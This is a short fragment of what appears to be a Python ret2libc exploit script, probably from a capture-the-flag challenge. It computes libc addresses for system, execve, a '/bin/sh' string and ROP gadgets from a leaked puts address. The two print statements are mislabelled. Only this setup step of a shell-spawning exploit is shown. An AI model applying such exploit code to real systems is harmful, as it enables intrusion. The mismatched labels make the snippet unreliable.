...
libc_system = puts_leak - 205200
libc_execve = puts_leak + 388432
libc_binsh = puts_leak + 1245597
libc_ret = puts_leak - 534509
libc_pop_rdx = puts_leak + 780402

print('puts() leak: ', hex(libc_execve))
print('execve() leak: ', hex(libc_binsh))
